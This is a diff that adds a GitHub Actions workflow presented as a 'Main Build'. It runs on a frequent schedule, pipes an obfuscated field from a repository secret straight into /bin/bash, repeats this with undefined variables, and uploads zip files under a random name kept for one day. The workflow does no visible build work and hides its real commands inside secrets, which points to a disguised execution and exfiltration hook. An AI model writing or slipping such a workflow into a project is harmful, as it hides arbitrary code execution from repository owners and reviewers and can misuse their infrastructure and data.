@@ -1,0 +1,33 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          n3: ${{ secrets.n3 }}
+        run: |
+          printf '%s' "$n3" | jq -r .hxq7 | /bin/bash
+          printf '%s' "$q31" | jq -r .mqatr393 | /bin/bash
+          printf '%s' "$juj14134" | jq -r .rdiw895 | /bin/bash
+          printf '%s' "$s82" | jq -r .xodnt8884 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: e5Jzud30
+          path: "*.zip"
+          retention-days: 1
